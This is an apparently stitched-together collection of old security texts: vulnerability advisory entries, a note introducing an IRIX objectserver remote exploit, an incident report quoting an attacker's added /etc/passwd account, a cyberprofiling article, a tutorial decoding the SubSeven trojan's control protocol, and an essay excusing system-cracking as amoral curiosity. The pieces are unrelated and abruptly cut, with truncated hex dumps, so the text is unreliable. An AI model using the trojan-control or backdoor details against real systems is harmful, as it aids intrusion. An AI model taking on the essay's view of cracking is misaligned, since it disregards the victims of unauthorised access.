      server by requesting a buffer be reserved for an extremely large amount of
      data, and then keeping the session open without sending the data. It is
      possible for an attacker to consume enough memory to cause the server to
      stop functioning properly. The server could be restored by stopping and
      restarting the IIS service.

      Attack Type:            Network/Host Based
      
      Netscape Enterprise Server version 3.x contains a feature called Directory
      Indexing. This feature, which is enabled by default, displays a directory
      listing when the a user includes certain tags in a requested URL. This

      Vulnerability:          win-dos-devicename-dos
      Platforms Affected:     Windows 95
                              Windows 98
      Risk Factor:            Medium
      Attack Type:            Network Based
      
      Microsoft Windows 95 and 98 contain a vulnerability in the parsing of file
      path names. DOS device names, such as COM1 or LPT1, are reserved words and
      normally cannot be used as file or directory names. If a user attempts to
      access a file path name that includes one DOS device name, it is treated
      as invalid, and an error is returned. However, if the path name includes
      multiple DOS device names, the machine will crash.

      The wmcdplay CD player program is vulnerable to a buffer overflow attack.
      An local attacker can pass an argument to overflow the stack, due to
      insufficient bounds checking on calls to sprintf. The program is setuid
      root, allowing an attacker to gain root privileges by overflowing the
      stack and executing arbitrary code on the system.

      Microsoft Clip Art Gallery, shipped with such packages as Microsoft Office
      2000 and Microsoft Works 2000, contains a possible buffer overflow in the
      handling of CIL files. The CIL file format is used for downloading
      additional clips for installation into the gallery. If a CIL file is
      created with a long field embedded in it, it will overflow the buffer and
      crash the Clip Gallery, which could result in the execution of arbitrary
      code.

      The installation program for Oracle 8.1.5i contains a vulnerability that
      could allow an attacker to gain root access. The Oracle installation
      script creates the directory /tmp/orainstall, owned by oracle:dba, mode
      711, containing the shell script orainstRoot.sh, mode 777. Then, the
      installation program stops and asks the user to run the orainstRoot.sh
      script. An attacker could create a symbolic link from this file to
      elsewhere on the file system, which could be used to create an .rhosts
      file and gain access to the root account. A local user could also edit
      this script to execute arbitrary commands when run by root.

      The Bat! is a mail agent for Windows developed by Rit Research Labs. One
      of the program's features is that it saves attachments from incoming mail
      in a specified folder on the system, and adds the file's path to the
      incoming message as a pseudo-header called X-BAT-FILES. If a message with
      an attachment is forwarded to someone else, the pseudo-header line
      remains. This allows the recipient to see the sender's default location
      for all saved email attachments.

      Hi.  As a legitimate function of my work I routinely archive and catalog
      vulnerability information and exploit code.  In the interest of
      full-disclosure and in possibly helping system administrators evaluate
      the security of their SGI boxen, I am attaching the remote exploit for
      Irix objectserver (udp 5135).
      
      There are big problems with the US government right now - if you are
      doing security work (let alone cracking!) be advised that things are
      getting seriously fucked.  See the "L0phtcrack as a burglary tool"
      article?  See all these kids getting PRISON sentences for typing?  The
      government isn't playing by sane rules.  Be prepared.  Be awake!

      Since the patches are now officially released, I feel I can finally
      release the details of the SGI objectserver vulnerability.  This
      vulnerability was initailly reported to CERT and SGI Security on
      October 6, 1997.  A beta version of patch 2849 was provided in
      February 1998.

      SGI objectserver vulnerabilty allows remote users to create accounts.
      
      Yesterday two of our hosts were compromised by an (as far as I could
      determine) unknown, unpatched bug in SGI's objectserver.  The attack
      consisted of sending UDP packets to port 5135 (see below).  The
      result was a non-root account being added to the system.  The two
      compromised hosts were running IRIX 6.2, but the vulnerability may
      affect other versions of IRIX.  The vulnerability does not appear to
      give root access directly, as the attackers used other IRIX
      vulnerabilities to gain root access after logging into the new
      account.
      
      Attached are the UDP packets exchanged between the attacking host
      (aaa.aaa.aaa.aaa) and the target host (ttt.ttt.ttt.ttt).  IP
      addresses have been masked to protect the guilty - I mean innocent
      until proven guilty.  The result of this sequence of packets is the
      following line added to /etc/passwd:
      
          gueust:x:5002:20:LsD:/tmp/.new:/bin/csh
      
      An entry must also be added to /etc/shadow since the attacker then
      logs into the new account with a password.
      
      As a temporary measure we have blocked all traffic to port 5135 at
      our gateway.

      TCP and UDP headers have been separated out.  I've decoded some of the
      packet contents into its ascii equivalent below the line.

      DIGITAL FORENSICS SIDEBAR  CYBERPROFILING

      CyberCrime Watch       Computers don't commit electronic breaches. People 
      do. BY TERRY M. GUDAITIS

      Contrary to depictions in Hollywood movies, those responsible for the 
      majority of cyber- crimes, hacking incidents and cyberdeviant acts cannot 
      be "profiled" as a certain demographic type. Cyberstalkers and online 
      child pornographers do not look deviant; in fact, they are as diverse as 
      the employee population of any company. Con-sider, for example, two recent 
      perpetrators: the former head of Disney's Go Nework, Patrick Naughton, who 
      has been charged with trying to meet a 13-year-old girl he encountered in 
      an Internet chat room, allegedly with the intent to have sex with her; and 
      Harvard Divinity School's former dean, Ronald Thiemann, who was dismissed 
      for storing child pornography on his office PC. 

      Many infosecurity practitioners think about their work within a purely 
      technical context: firewalls, routers, switches, monitoring software and 
      so on. This is particularly the case when it comes to cyberforensics. 
      While it's clear that a technical approach to forensics is critical to 
      uncovering evidence from computer-based crimes, the tendency to focus on 
      technology alone comes at the expense of an equally important activity: 
      cybercrime profiling. 

      One aspect of infosec that is consistently overlooked, underestimated or 
      incorrectly defined is the human dimension. Humans are the catalysts 
      behind the keyboards and modems used to conduct computer crimes. 
      Consequently, anyone who has responsibility for systems security, incident 
      response teams, business continuity planning and IT hiring must understand 
      the implications of online behavior and computer use beyond purely 
      technical considerations. They must understand how to identify 
      cyberdeviant behavior, how to identify the perpetrators, how to protect 
      the innocent and how to reduce organizational vulnerability. 

      What Is Cyberprofiling?       Profiling is the process by which a crime 
      scene is observed, evaluated and assessed from behavioral, psychological 
      and criminological perspectives in order to provide sociological insight 
      into the offending individual(s). The concept behind criminal profiling is 
      that weapons do not commit the crimes--people do. Put in a technical 
      context, computers don't hack--hackers do. The individuals who are 
      penetrating systems, launching distributed denial-of-service attacks and 
      defacing Web pages are the problem, not the advancing technologies and the 
      availability of hacking scripts on the Internet. Profiling provides the 
      necessary means to assess and understand the perpetrators of these 
      electronic crimes. 

      For decades, criminal or psychological profiling has been used by law 
      enforcement and the intelligence community to assess criminals, groups, 
      organizations, cultures and, most notably, serial killers. Analogously, 
      most hackers do not hack just once. They have a pattern, an MO and a 
      "signature." The use of criminal profiling in a technical setting is an 
      effective tool to narrow the suspect pool, provide insight into the 
      motivation of the perpetrator, possibly predict the hacker's next move 
      (which, in recent notable cases, involved attempted extortion) and, 
      ultimately, assist in the interview and interrogation process of an 
      identified perpetrator. 

      When assessing a conventional crime scene, investigators enlist the 
      assistance of relevant professionals, including demolitions experts, 
      medical examiners, fingerprint examiners, ballistics experts and 
      psychological profilers. Cyberprofiling involves a similar process, with 
      technical experts, systems ad-ministrators, Web programmers, Unix experts, 
      Windows gurus and antivirus specialists. The added tool of profiling 
      centers on the behavior of the perpetrator. 

      When used in conjunction with technical forensics tools, cyberprofiling 
      helps you        Narrow the suspect pool o Identify single or multiple 
      perpetrators  Determine an organization's vulnerabilities  Predict 
      perpetrator behavior  Mitigate an incident  Supplement the interview or 
      interrogation process  Assist in the evidence collection and prosecution 
       Provide suggestions and follow-up post-incident 

      Profiling Myths and Legends       The depiction of criminal and 
      psychological profiling in movies and on TV often misrepresents what 
      profiling really is...and how a profile is generated.  Profiling is not 
      psychological testing; and psychological testing does not derive a 
      profile.  Profiling is not a static process; people are dynamic and 
      distinct, and the process of profiling must be dynamic and evolving.  
      Profiling is not inductive. It is not studying data, creating a template 
      and applying that template to criminal incidents.  Profiling is conducted 
      on a case-by-case basis. The profile is derived deductively from that 
      case-specific data. 

      The most important thing to realize is that every case is distinct: There 
      is no one hacker profile! 

      In the never-ending battle against computer crime, companies have invested 
      substantial capital in advanced computer forensics tools and intrusion 
      detection technologies. At the same time, organizations have spent a great 
      deal of money educating employees combating hostile work environments, 
      discrimination and sexual harassment. For cyberforensics to be a complete 
      science, the same level of emphasis and funding must be devoted to the 
      "human side" of computer crime investigation.

      Introduction:
      ===============
      The skills tought in this text can be used for a variety of purposes such as
      open sourcing programs and documenting protocols. It is a newbie text, so
      don't expect anything too exciting. As our example, we will examine _some_
      of the SubSeven protocol, and write some code to implement some of it (in C).
      It should be noted that this was written on and for Windows, but should be
      applicable to the Unix environment as well (to some degree). 
      
      Examinining the protocol
      ==========================
      Throughout this tutorial, we will examine the SubSeven 2.1 Gold protocol.
      First, we will need to obtain a dump of some of the protocol. For this we
      will use the following C source:

      #define LOOP_BACK "127.0.0.1"

      Configure your Sub7 server to listen to port 27374, and set the password to
      "hello". Run it. For gods sake make sure you are either NOT connected to any
      IP networks, or configure your firewall to block any traffic to port 27374
      from anything but your system's loop-back address. Compile and run
      dumpprot.c. Connect to port 2000 with the Sub7 client. Now, do the following,
      and _only_ the following (your dump of the protocol should be the same as the
      one shown here).
      1) Enter the password ("hello").
      2) Select "keys/messages".
      3) Click on "msg manager".
      4) Select "Warning" as the icon.
      5) Select "Yes, no, cancel" as the buttons.
      6) Enter "title" as the message title.
      7) Enter "text" as the message text.
      8) Click on "send message".
      9) Respond by clicking on "yes".
      10) Repeat steps 8 and 9, but this time select "no".
      11) Change the icon to "error".
      12) Send the message (select "yes").
      13) Change the button to "OK".
      14) Send the message.
      15) Exit dumpprot.
      
      Your results should look like this:
      [snip]
      Waiting for connection...accepted from [127.0.0.1].
      Connecting to [127.0.0.1]...
      Linked: [127.0.0.1]<->[127.0.0.1]
      Server: [PWD]
      Client: [PWDhello]
      Server: [connected. 19:54.08 - April 5, 2000, Wednesday, version: GOLD 2.1]
      Client: [MW:51titleZJXXtext]
      Server: [user clicked : Yes.]
      Client: [MW:51titleZJXXtext]
      Server: [user clicked : No.]
      Client: [MW:53titleZJXXtext]
      Server: [user clicked : Yes.]
      Client: [MW:03titleZJXXtext]
      Server: [user clicked : Ok.]
      [snip]
      
      Let's break this down a little:
      [snip]
      Server: [PWD] // This is obviously the server telling the client that it
      can't connect until the correct password is sent. //
      
      Client: [PWDhello] // Here, the client sends back the correct password. //
      
      Server: [connected. 19:54.08 - April 5, 2000, Wednesday, version: GOLD 2.1]
      // The client now knows that it has connected, and the server is ready to
      accept commands. //
      
      // This next part will need to be looked at carefully. Pay attention to the
      two characters after the colon in each client request:
      Client: [MW:51titleZJXXtext] // "Yes, No, Cancel" button, "warning" icon. //
      Server: [user clicked : Yes.] // Self explanatory. This is shoved straight
      into the status bar at the bottom of the client window //
      
      Client: [MW:51titleZJXXtext] // "Yes, No, Cancel" button, "warning" icon. //
      Server: [user clicked : No.]
      
      Client: [MW:53titleZJXXtext] // "Yes, No, Cancel" button, "error" icon. The 1
      has changed to the three. Let's not make assumptions yet... //
      Server: [user clicked : Yes.]
      
      Client: [MW:03titleZJXXtext] // "OK" button, "error" icon. The 5 has changed
      to 0. It's fairly safe to assume that the first character represents which
      button combo, and the second the icon. //
      Server: [user clicked : Ok.] // Surprise, surprise. //
      [snip]
      
      Now we'll break down the structure of all messages a bit more. Make sure you
      save the dump of the protocol somewhere for later (you might need it). From
      what we have seen thus far most of this protocol uses regular alphanumeric
      characters. To see if there are any terminating characters to divide messages
      we will need to obtain a hex dump of a few messages. Here's the modified
      version of dumpprot.c that will do what we want (keep the old one):

      Recompile, run, and connect like before. This time though, don't do anything
      but connect (we only need a few messages). The output should look something
      like this:
      
      [snip]
      Waiting for connection...accepted from [127.0.0.1].
      Connecting to [127.0.0.1]...

      Client: [50 57 44 68 65 6c 6c 6f ]

      2 73 69 6f 6e 3a 20 47 4f 4c 44 20 32 2e 31 ]
      [snip]
      
      It looks as though there are no terminating characters, so the messages must
      be differentiated by what packets they arrive in.
      Let's take a look at that the message box message again:
      MW:51titleZJXXtext
      
      The format is probably:
      MW:<button><icon><title>ZJXX<text>
      
      <button> - character representing the button combo.
      <icon> - character representing the icon.
      <title> - string to be displayed in the message box title.
      <text> - string to be displayed in the body of the message box.
      
      Back to the password prompt: what happens if the password is incorrect?
      [snip]
      Server: [PWD]
      Client: [PWDsfdssdf]
      Server: [POPUP incorrect password...]
      [snip]
      
      Now, the client doesn't display any popup. In fact, I see no "incorrect
      password" message anywhere. I haven't gone into this any further, but the
      bottom line is that this is the indication given that this is the wrong
      password, and the connection is killed.
      
      Well, that concludes what we will learn about that part of the protocol. Now
      for some source code. All it does is connects to a Sub7 server, and prompts
      for password (if required). Yes it is pointless, but yes it is also
      educational. So read it.

      Click on the "connection" menu on the left of the client. Select "get pc

      this:

      This is all pretty straight forward, but we must find what character
      terminates each line (it is either 0xd or 0xa, or both). Run dumphex and do
      the same. Your output should look like this:
      [snip]

      62 79 74 65 73 d a 31 d a ]
      [snip]
      
      The first line is 10 characters long. If we count across 10 characters we
      find the string "\xd\xa" (C style, that is). This terminates the lines. The
      rest is pretty simple:
      Server: [GMICHOPSUI // After "GMI" is the m$ networking workstation name //
      Chopsuicide // currently logged in m$ networking user.
      C:\WINDOWS // Windows directory //
      C:\WINDOWS\SYSTEM // System directory 
      Chopsui-cide // Name Windows is registered to //
      The Mad Miget Mafia // Company this person comes from //

      1,955,995,648 bytes // Available space //
      1 // Number of clients connected //
      ]
      
      As seems typical of the Sub7 client, all these values appear to be shoved
      straight into their respective labels. It also performs no sanity checking -
      ie, it update the info even if it did not request it.
      
      Well, that concludes this text. I hope you have learned something here, and
      hope that when you know more you too share your knowledge with others.

       "But did you, in your three- piece psychology and 1950's
       technobrain, ever take a look behind the eyes of the hacker?
       Did you ever wonder what made him tick,
       what forces shaped him, what may have molded him?
       I am a hacker, enter my world..."

       THE HACKER 

       Another idiot has been locked up because of committing a senseless act 
       with little or no thought to the consequences. Law enforcement needs to 
       look good, the news becomes public domain and the press is unleashed, 
       using attention grabbing headlines like: "Computer terrorist busted", or 
       better, a "hacker". 

       Not only is the term misused, but it is usually only understood to be a 
       mere synonym for "computer pirate", which is not only limitive, but 
       completely wrong. Few people, even those who would define themselves as 
       such, really know what "being a hacker" means. 

       The WWWebster Online Dictionary (http://www.m-w.com/), at the "hacker" 
       entry says: 

            Main Entry: hacker Pronunciation: 'ha-k&r Function: noun Date: 14th 
            century 1 : one that hacks 2 : a person who is inexperienced or 
            unskilled at a particular activity "a tennis hacker" 3 : an expert 
            at programming and solving problems with a computer 4 : a person who 
            illegally gains access to and sometimes tampers with information in 
            a computer system

       Among the various meanings quoted above, (besides definition 1, which is 
       obvious...), definition 4 is the one which generally corresponds to the 
       idea of "the hacker" that the majority of people have, while definition 
       3, is the one which is actually closer to the real meaning of "hacker", 
       even if it is still rather limiting. 

       A dictionary rarely gives a definative answer, but it is always a good 
       start. For a more precise definition we can consult a specific dictionary 
       such as the Jargon File, the most prestigious dictionary of hacker 
       terminology, "a comprehensive compendium of hacker slang illuminating 
       many aspects of hackish tradition, folklore, and humor", begun by Raphael 
       Finkel of the university of Stanford in 1975, and then passed in 
       management to Don Woods of the MIT, up to see the light of the printed 
       paper in 1983, with the title of "The Hacker's Dictionary" (Harper & Row 
       CN 1082, ISBN 0-06-091082-8, also known in the scene as "Steele-1983"). 

       The on-line hacker Jargon File, version 2.9.10, 01 JUL 1992 (part of the 
       Project Gutenberg), at the "hacker" entry says: 

            :hacker: [originally, someone who makes furniture with an axe] n. 1. 
            A person who enjoys exploring the details of programmable systems 
            and how to stretch their capabilities, as opposed to most users, who 
            prefer to learn only the minimum necessary. 2. One who programs 
            enthusiastically (even obsessively) or who enjoys programming rather 
            than just theorizing about programming. 3. A person capable of 
            appreciating {hack value}. 4. A person who is good at programming 
            quickly. 5. An expert at a particular program, or one who frequently 
            does work using it or on it; as in `a UNIX hacker'. (Definitions 1 
            through 5 are correlated, and people who fit them congregate.) 6. An 
            expert or enthusiast of any kind. One might be an astronomy hacker, 
            for example. 7. One who enjoys the intellectual challenge of 
            creatively overcoming or circumventing limitations. 8. [deprecated] 
            A malicious meddler who tries to discover sensitive information by 
            poking around. Hence `password hacker', `network hacker'. See 
            {cracker}. 

       Since this is a specific dictionary, the definition of hacker here is 
       closer to its original meaning, even if it is necessary to extrapolate it 
       from the varied proposed meanings in order to obtain the closest and most 
       faithfull interpretation. 

       A hacker is a person that loves to study all things in depth (definition 
       1), especially the more apparently meaningless details, to discover 
       hidden peculiarities, new features and weakness in them. For example, it 
       is possible to hack a book, by using it to equalize the legs of a table, 
       or to use the sharp edge of one of its pages to cut something. The main 
       point being that it is used for more than it's conventional function of 
       being read. But more than this, a hacker soon learns that the same 
       techniques used for exploiting computer systems can be used to manipulate 
       people. This is the so-called social hacking. With a little skilled 
       psychology, the masters of "social hacking" can convince other people to 
       do what they want (within limits of course, and depending on the 
       abilities of the "social hacker"), in order to obtain the information 
       they require. This may sound like an unusual and unatural practise, but 
       once you take into account that this is performed quite regularly, in 
       everyday life, by girlfriends, friends and teachers etc. to obtain what 
       they want from others, it's not that strange, even if hackers do use a 
       little more skill and technique. Another way of bringing hacking out from 
       the computer's world, is the so-called vadding (the term is actually 
       rarely used, but the activity is largely practiced) this consists of 
       exploring places where the average person doesn't normally have access, 
       such as basements, roofs of public buildings, maintenance tunnels, 
       elevator wells and similar places. Sometimes, some of these activities 
       born inside the hacker scene, grow and eventually separate, becoming new 
       entities, like phreaking, the term applied to the world of "hacking" 
       telephones and telephone systems, or the term carding, which is basically 
       "techno-credit card fraud",.. very illegal and risky. In short, a hacker 
       has the tendency to use his skills also beyond of the computer context, 
       and anywhere tends to use the hacking techniques and to discover what is 
       normally hidden to the common man. For a hacker, the ability to reason, 
       harness his full brain capacity and maintain his mind at maximum 
       efficiency levels, is most important. With a few exceptions, it is 
       unusual that a hacker would smoke, use drugs, or drink excessively 
       (however beer appears to be the preferred choice, when alcohol is drunk). 
       Speaking of John Draper, (a.k.a "Captain Crunch", one of the most 
       legendary phreaker/hackers, famous for discovering that by sending a tone 
       of 2600Hz over the telephone lines of AT&T, it was possible to effect 
       free calls), Steven Levy says: "Cigarettes made him violent": smoking 
       next to him was extremely hazardous to your health... 

       A hacker is certainly a programming maniac, (definition 2): once a 
       technique has been discovered, it is necessary to write a program that 
       exploits it. Hackers often spend many day's and night's in front of a 
       computer, programming or experimenting with new techniques. After 
       spending so many hours in front of a computer, a hacker gains a 
       remarkable ability to analyze large amounts of data very quickly. The 
       ability to program quickly, (definition 4) can be a characteristic of a 
       hacker, but is not always necessarily so. As far as a hacker is 
       concerned, it is faster to type on a keyboard, than it is to write things 
       down, many hackers spend quite a lot of time reflecting over, or 
       analyzing previously written code, while they are programming. Definition 
       5 is, in effect, a restrictive meaning of the word "hacker" since it 
       limits it to a single field (as in UNIX), it can however be considered as 
       a specialization. Actually in these cases, especially when it concerns 
       true experts in a field, the terms wizard or guru are preferred. For 
       example, the definition "UNIX wizard" in the United States is also 
       recognized outside of the hacker environment and it can be included in a 
       resume. 

       Definition 3 may be considered apart: a person that qualifies for this 
       definition is not neccasarily a real hacker, but a very experienced 
       person with a good knowledge, who is not neccasarily able to develop 
       hacker techniques. To make it clearer, think about the differences 
       between a good author and someone that appreciates a good book. 

       Definition 7, together with definition 1, are the ones that get closer to 
       the real essence of the hacker. To study a system, to discover 
       weaknesses, the peculiarities and hidden features of it, and then use 
       them to go beyond its limits, with creativeness and imagination. This, in 
       a certain way, brings us directly to definition 8. The person with these 
       skills can use his knowledge to try to access information to which he 
       doesn't have the right to access, and here the discourse gets 
       complicated, because for a hacker there is no information which he does 
       not have the right to access. We will get back to this point later, when 
       we will speak about the "hacker ethic". 

       Finally, although it has nothing to do with the character of the hacker, 
       I would like to attract attention to definition 6; for a hacker, the term 
       hacker is always positive: if he speaks of a "hacker of astronomy", he 
       speaks of a true expert of that subject. Contrary to this, in everyday 
       language, according to definition 2 of the WWWebster dictionary, a 
       "hacker" in a certain field is a person that is not skilled in that 
       specific field. 

       After giving the definitions, the Jargon File provides more information 
       on the meaning of the word "hacker": 

            The term `hacker' also tends to connote membership in the global 
            community [...]. It also implies that the person described is seen 
            to subscribe to some version of the hacker ethic [...]. 

            It is better to be described as a hacker by others than to describe 
            oneself that way. Hackers consider themselves something of an elite 
            (a meritocracy based on ability), though one to which new members 
            are gladly welcome. There is thus a certain ego satisfaction to be 
            had in identifying yourself as a hacker (but if you claim to be one 
            and are not, you'll quickly be labeled {bogus}). [...] [or most 
            commonly, the most used term in these circumstances is "lamer", even 
            if next versions of the Jargon File use this term in a slightly 
            different context] 

       But, perhaps more than anything else, curiosity and above average 
       intelligence are the signatures of a true hacker. The hacker has an 
       almost physical need of knowledge of any kind. The hacker is most 
       certainly a voracious reader, even if his preference is only for 
       scientific matters or science fiction, and generally one would find many 
       shelves full of books in his room. But a hacker is not satisfied by the 
       "ready made" knowledge, of the information that he finds in the books 
       written for the average person, a hacker wants it all, and collects all 
       possible information. Schools are institutions that are not able to 
       furnish all the information that a hacker needs. The governments and all 
       the public or private institutions have the tendency to furnish the least 
       necessary information. About this point, Steven Levy in "Hackers, Heroes 
       of the Computer Revolution" (written in 1984), affirms that the hackers 
       "are possessed not merely by curiosity, but by a positive *lust to 
       know.*" 

       This idea is even clearer in these excerpts took from what is a 
       considered "the hacker's manifesto": "The Conscience of to Hacker" 
       (sometimes erroneously reported, in a nearly prophetic sense, as 
       "Mentor's Last Words"), written by The Mentor on January 8th 1986, and 
       published for the first time on the e-zine Phrack, Volume One, Issue 7, 
       Phile 3. This text collects in a few paragraphs, a large part of the 
       hacker philosophy, with touching results for most true hackers (even if 
       it may be difficult to think of a hacker as a person that has a heart as 
       well as a brain). 

            [...] 

            Mine is a world that begins with school... I'm smarter than most of 
            the other kids, this crap they teach us bores me... Damn 
            underachiever. 

            [...] 

            we've been spoon-fed baby food at school when we hungered for 
            steak... the bits of meat that you did let slip through were 
            pre-chewed and tasteless. We've been dominated by sadists, or 
            ignored by the apathetic. The few that had something to teach found 
            us willing pupils, but those few are like drops of water in the 
            desert. 

            [...] 

            We explore... and you call us criminals. We seek after knowledge... 
            and you call us criminals. We exist without skin color, without 
            nationality, without religious bias... and you call us criminals. 
            You build atomic bombs, you wage wars, you murder, cheat, and lie to 
            us and try to make us believe it's for our own good, yet we're the 
            criminals. 

            Yes, I am a criminal. My crime is that of curiosity. My crime is 
            that of judging people by what they say and think, not what they 
            look like. My crime is that of outsmarting you, something that you 
            will never forgive me for. 

            [...] 

       In these words, you will see the frustration of living in a defective 
       world, that deprives the individuals that wish to rise above the 
       mediocre, of the very information and resources they desire, to know what 
       is kept hidden, and it condemns them hypocritically as criminals. 

       But the desperate search of knowledge is only one of the characteristics 
       of the hacker. Another sure one is the pursute of extreme perfection. An 
       interesting article, is the one that narrates the history of the first 
       hackers, and of how they developed "Spacewar!" (the first videogame in 
       history, born as a demo for the TX-0, meant as a "killer application" for 
       this computer, with all its features exploitable), is "The origin of 
       Spacewar", written by J. M. Graetz, and published in the August, 1981 
       issue of Creative Computing magazine.

            One of the forces driving the dedicated hacker is the quest for 
            elegance. It is not sufficient to write programs that work. They 
            must also be "elegant," either in code or in function -- both, if 
            possible. An elegant program does its job as fast as possible, or is 
            as compact as possible, or is as clever as possible in taking 
            advantage of the particular features of the machine in which it 
            runs, and (finally) produces its results in an aesthetically 
            pleasing form without compromising either the results or operation 
            of other programs associated with it. 

       But the elegance and the perfection of hackers is not always 
       comprehensible to the average individual. A hacker can often be in 
       ecstasy reading some code written by another hacker, admiring his ability 
       and "tasting" his style, as if he was reading poetry. 

       For example, normally to exchange the content of two variables (a and b, 
       in this case), the statement most commonly used is this, which uses a 
       third temporary variable: 

            dummy = a : a = b : b = dummy 

       The following method, instead, doesn't need the third variable, because 
       it exploits a mathematical peculiarity of the boolean operator XOR: 

            a = a XOR b : b = a XOR b : a = a XOR b 

       Even if this system is at least three times slower than the first one 
       because it requires the execution of three mathematical operations, 
       (however it allows the saving of memory that the third variable would 
       normally occupy), a hacker will surely admire the ingeniousness and the 
       elegance of this method, to him it assumes the taste of a Japanese haiku. 

       Talking about the perfectionism of the hackers, in "Hackers: Heroes of 
       the Computer Revolution" written by Steven Levy in 1984, in the chapter 2 
       ("The Hacker Ethic"), we read: 

            Hackers believe that essential lessons can be learned about the 
            systems--about the world--from taking things apart, seeing how they 
            work, and using this knowledge to create new and even more 
            interesting things. They resent any person, physical barrier, or law 
            that tries to keep them from doing this. 

            This is especially true when a hacker wants to fix something that 
            (from his point of view) is broken or needs improvement. Imperfect 
            systems infuriate hackers, whose primal instinct is to debug them. 
            This is one reason why hackers generally hate driving cars--the 
            system of randomly programmed red lights and oddly laid out one-way 
            streets causes delays which are so goddamned UNNECESSARY that the 
            impulse is to rearrange signs, open up traffic-light control boxes . 
            . .redesign the entire system. 

            In a perfect hacker world, anyone pissed off enough to open up a 
            control box near a traffic light and take it apart to make it work 
            better should be perfectly welcome to make the attempt. 

       It's just in the name of such principle that the Linux operating system 
       and the Gnu C compiler have been developed, their code is open and 
       available to be changed and modified by anyone. Lately, many important 
       commercial software producers also started moving in this direction, as 
       Netscape: Netscape Communicator 5, will, in fact be the first software, 
       originally born as a "closed" commercial product, to be developed with 
       this type of philosophy. 

       A hacker is never satisfied with the default settings of a program or of 
       the custom installations, he always has to open the configuration menu 
       and set the options to get the maximum performance, and to make the 
       product work as close as possible to his "way". A hacker must be able to 
       use, to modify and to check all the possible features of a program. 

       But after all, what motivates hackers? Why do they create programs that 
       exploit advanced techniques and then distribute them free? And why do 
       they freely distribute knowledge that was incredibly difficult to obtain? 
       A good answer could be found in the site of the KIN (Klever Internet 
       Nothings, http://www.klever.net), they are not exactly a hacker crew, but 
       a group of people that write programs and release them freely on the 
       Internet: 

            What makes people write software and distribute it for free? Vanity, 
            you said? Well, maybe.. But after all, what is this business all 
            about? Is it all about money? Ask anyone - it's not. Most people I 
            know in the industry will tell you that. Their idea is "just leave 
            me alone and let me do what I love to do". 

       In short, it's not about money. It's about feeling free to do what you 
       want, and, just possibly, to find someone that appreciates your work. 


       THE HACKER ETHIC 

       The true hacker doesn't have morals, and he would never censor 
       information or ideas of any kind. An initiative of the Italian priest Don 
       Fortunato di Noto, (fortunad@sistemia.it,) who in January of 1998 formed 
       the "Committee of resistance against the Pedophiles", and who asked for 
       the help of the hacker community to unmask, capture and close the sites 
       of the pedophiles on the Internet, failed miserably as it was only 
       supported by self-acclaimed hackers without any skill. Besides, hackers 
       are tolerant by nature, and rarely get angry, but they are irritated by 
       people and tasks perceived to be wasting their time. There are however, 
       some things that hackers can be intolerant of. One of these is when lies 
       are told, to, or about them, you can say that hackers are imbeciles (it's 
       an opinion, after all), but you can not say that they steal chickens. And 
       yet, it would still be unusual that hackers would hack a site to remove 
       the lies propogated about them. It would be more typical that they would 
       create another site, refuting the lies against them. Hacking can be used 
       like as a form of protest, breaking into and modifying the websites of 
       very well known societies and government or military corporate entities, 
       can be a way to make public certain injustices (especially attacks to the 
       liberty of information or expression) or violations of human rights. The 
       hacks, of the websites of the CIA (that became Central Stupidity Agency) 
       and of the Department of Justice, are famous for being hacked with this 
       intention in mind. In the article "Hacking for Human Rights?" by Arik 
       Hesseldahl (ahess@reporters.net) published on the online magazine Wired 
       (http://www.wired.com) dated 14.Jul.98 9:15am, the hacker Bondie Wong, (a 
       dissident Chinese astrophysicist who lives in Canada, that temporarily 
       disabled a Chinese satellite in 1997), a member of the famous hacker 
       crew, Cult of the Dead Cow (which in the beginning of 1999 released the 
       Back Orifice trojan) threatened to attack the computer networks of 
       foreign companies that did business with China, causing them serious 
       damages and huge financial losses. In an interview conducted by Oxblood 
       Ruffin, a former United Nations consultant, and published on Wired, 
       Blondie Wong says: "Human rights is an international issue, so I don't 
       have a problem with businesses that profit from our suffering paying part 
       of the bill". 

       Contrary to the complete lack of moral judgement (but, above all, of 
       moralism) of hackers, lies a deep ethical sense, that is something 
       allmost "religious" in most hackers. About this point, we can go back to 
       the Jargon File: 

            :hacker ethic, the: n. 1. The belief that information-sharing is a 
            powerful positive good, and that it is an ethical duty of hackers to 
            share their expertise by writing free software and facilitating 
            access to information and to computing resources wherever possible. 
            2. The belief that system-cracking for fun and exploration is 
            ethically OK as long as the cracker commits no theft, vandalism, or 
            breach of confidentiality. 

            Both of these normative ethical principles are widely, but by no 
            means universally) accepted among hackers. Most hackers subscribe to 
            the hacker ethic in sense 1, and many act on it by writing and 
            giving away free software. A few go further and assert that *all* 
            information should be free and *any* proprietary control of it is 
            bad [...] 

            Sense 2 is more controversial: some people consider the act of 
            cracking itself to be unethical [...] But this principle at least 
            moderates the behavior of people who see themselves as `benign' 
            crackers (see also {samurai}). On this view, it is one of the 
            highest forms of hackerly courtesy to (a) break into a system, and 
            then (b) explain to the sysop, preferably by email from a 
            {superuser} account, exactly how it was done and how the hole can be 
            plugged --- acting as an unpaid (and unsolicited) {tiger team} [The 
            "tiger team" derives from the U.S. military jargon. These people are 
            paid professionals who do hacker-type tricks, e.g., leave cardboard 
            signs saying "bomb" in critical defense installations, hand-lettered 
            notes saying "Your codebooks have been stolen" (they usually haven't 
            been) inside safes, etc. Serious successes of tiger teams sometimes 
            lead to early retirement for base commanders and security officers]. 

            [...] 

       Breaking into a system is not seen by the hacker as a criminal action, 
       but like a challenge. The idea is not to damage the "victim", but to find 
       a way to penetrate its defenses. It's the intellectual challenge, the 
       curiosity, the will to experiment and to explore, this is what moves the 
       hacker, not the will to damage someone or something, and not even to 
       obtain personal profit. 

       In another writing of The Mentor, "A Novice's Guide to Hacking- 1989 
       edition", dated December 1988, the author opens the essay with a call to 
       the ethics of the category, to which follows a list of "suggestions for 
       guidelines to follow to ensure that not only you stay out of trouble, but 
       you pursue your craft without damaging the computers you hack into or the 
       companies who own them": 

            As long as there have been computers, there have been hackers. In 
            the 50's at the Massachusets Institute of Technology (MIT), students 
            devoted much time and energy to ingenious exploration of the 
            computers. Rules and the law were disregarded in their pursuit for 
            the 'hack'. Just as they were enthralled with their pursuit of 
            information, so are we. The thrill of the hack is not in breaking 
            the law, it's in the pursuit and capture of knowledge. 

       In a file titled "The Hotmail Hack" written by Digital Assassin of the 
       "United Underground" (or "U2", for short), in which a weakness of the 
       HotMail system is illustrated, through which it is possible to enter into 
       the mailbox of another person, the author, at a certain point interrupts 
       the explanation with these words: 

            ....but before I tell you how to use that line, I'm going to side 
            track for a little theory behind this hack. Because there's NO point 
